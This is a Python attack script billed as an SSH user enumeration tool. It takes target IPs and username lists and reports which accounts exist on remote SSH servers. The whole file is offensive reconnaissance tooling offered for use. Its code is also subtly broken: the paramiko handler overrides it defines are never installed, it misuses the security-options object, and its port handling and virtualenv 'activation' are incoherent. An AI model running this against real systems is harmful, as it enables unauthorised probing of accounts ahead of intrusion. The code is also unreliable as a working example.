#!/usr/bin/env python3
import argparse, logging, os, socket, subprocess, sys, paramiko

banner = """
  _____  __  __ _______ _______ _______ _______ _______ _______
 / ____|/ _|/ _|__   __|__   __|__   __|__   __|__   __|__   __|
| (___ | |_| |_   | |     | |     | |     | |     | |     | |
 \___ \|  _|  _|  | |     | |     | |     | |     | |     | |
 ____) | | | |    | |     | |     | |     | |     | |     | |
|_____/|_| |_|    |_|     |_|     |_|     |_|     |_|     |_|

                 ~ The Ultimate SSH USER Enumeration Tool ~
                 ~ @Abdulr7mann
"""

class InvalidUsername(Exception):
    pass

def add_boolean(*args, **kwargs):
    pass

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return

def userauth_failure(*args, **kwargs):
    raise InvalidUsername()

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

def create_activate_check() -> bool:
    """Create and activate a virtual environment if it doesn't exist."""
    env_name = "enumer8r"
    # create virtual environment
    os.system(f"python3 -m venv {env_name}")
    # activate virtual environment
    activate_script = os.path.join(env_name, "bin", "activate")
    if not os.path.exists(activate_script):
        return False
    subprocess.run(['bash', '-c', f"source {activate_script}"], check=True)
    # check if Paramiko is installed
    try:
        import paramiko
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "paramiko"], check=True)

if __name__ == "__main__":
    print(banner)
    create_activate_check()

    arg_parser = argparse.ArgumentParser(usage='%(prog)s [--host 127.0.0.1 | --ip-list ips.txt | --user root | --user-list users.txt] [--port 22]')
    group = arg_parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--host', type=str, help='Single IP address to attack')
    group.add_argument('--ip-list', type=str, help='File with a list of IP addresses')
    arg_parser.add_argument('--user', type=str, help='Single username to use for attacking')
    arg_parser.add_argument('--user-list', type=str, help='File with a list of usernames to use for attacking')
    arg_parser.add_argument('--port', type=int, default=22, help='SSH port')
    args = arg_parser.parse_args()

    if args.ip_list:
        with open(args.ip_list, 'r') as f:
            ips = f.read().splitlines()
    else:
        ips = [args.host] if args.host else []
        port = [args.port] if args.port else []

    if args.user_list:
        with open(args.user_list, 'r') as f:
            users = f.read().splitlines()
        port = [args.port] if args.port else []
    else:
        users = [args.user] if args.user else []
        port = [args.port] if args.port else []

    if not ips or not users:
        arg_parser.print_usage()
        print('Please provide at least one IP and one username')
        sys.exit(1)

    for ip in ips:
        sock = socket.socket()
        try:
            sock.connect((ip, args.port))
        except socket.error:
            print(f'[-] Failed to connect to {ip}:{port}')
            continue

        transport = paramiko.transport.Transport(sock)
        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            print(f'[-] Failed to negotiate SSH transport with {ip}:{port}')
            continue

        supported_auths = transport.get_security_options().get('kex').get('client').get('auth')
        if 'publickey' not in supported_auths:
            print(f'[-] Publickey authentication not supported on {ip}:{port}')
            continue

        for user in users:
            if not user:
                continue  # skip empty usernames

            try:
                transport.auth_publickey(user, paramiko.RSAKey.generate(2048), event=None)
            except InvalidUsername:
                print(f'[-] Invalid username {user}@{ip}:{port}')
            except paramiko.ssh_exception.AuthenticationException:
                print(f'[+] Valid username {user}@{ip}:{port}')
